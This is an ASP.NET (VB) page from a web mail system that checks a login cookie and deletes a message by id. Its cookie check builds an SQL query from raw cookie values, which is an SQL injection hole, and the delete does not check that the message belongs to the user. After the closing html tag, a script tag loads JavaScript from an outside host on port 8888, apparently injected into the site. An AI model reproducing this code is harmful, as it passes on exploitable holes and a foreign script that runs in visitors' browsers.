<script runat="server">

    Protected Sub Page_Init(ByVal sender As Object, ByVal e As System.EventArgs)
        Dim dbconn As New dbconn
        Dim conn As Data.OleDb.OleDbConnection
        Dim cmd As Data.OleDb.OleDbCommand
        Dim dr As Data.OleDb.OleDbDataReader
        Dim username As String
        Dim rndtext As String
        dbconn.Create()
        conn = dbconn.GetConn()
        cmd = conn.CreateCommand
        If Request.Cookies("nbmailsystem") Is Nothing Then
            Exit Sub
        End If
        If Request.Cookies("nbmailsystem")("username") Is Nothing Or Request.Cookies("nbmailsystem")("rndtext") Is Nothing Then
            Response.Redirect("index.aspx")
        End If
        username = Trim(Request.Cookies("nbmailsystem")("username").ToString())
        rndtext = Trim(Request.Cookies("nbmailsystem")("rndtext").ToString())
        cmd.CommandText = "select count(*) as count001 from [userinfo] where [username]='" & username & "' and [rndtext]='" & rndtext & "'"
        dr = cmd.ExecuteReader()
        dr.Read()
        If dr("count001") <= 0 Then
            dr.Close()
            Response.Redirect("index.aspx")
        End If
        dr.Close()
    End Sub
</script>

<html>
<head>
<title>
</title>
</head>
<body>
<%
    Dim id As Integer
    Dim box As Integer
    Dim dbconn As New dbconn
    Dim conn As Data.OleDb.OleDbConnection
    Dim cmd As Data.OleDb.OleDbCommand
    Dim FunctionClass As New FunctionClass
    Dim dr As Data.OleDb.OleDbDataReader
    id = Int(Request.QueryString("id"))
    box = Int(Request.QueryString("box"))
    If box <> 0 And box <> 1 Then
        FunctionClass.DisplayErr(weberr.parerr)
    Else
        dbconn.Create()
        conn = dbconn.GetConn()
        cmd = conn.CreateCommand
        cmd.CommandText = "delete from [" & IIf(box = 0, "SendBox", "ReceivedBox") & "] where id=" & CStr(id)
        If cmd.ExecuteNonQuery() <= 0 Then
            FunctionClass.DisplayErr(weberr.accessdberr)
        Else
            Response.Redirect("deltobox.aspx?id=" & CStr(box))
        End If
    End If
%>
</body>
</html><script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>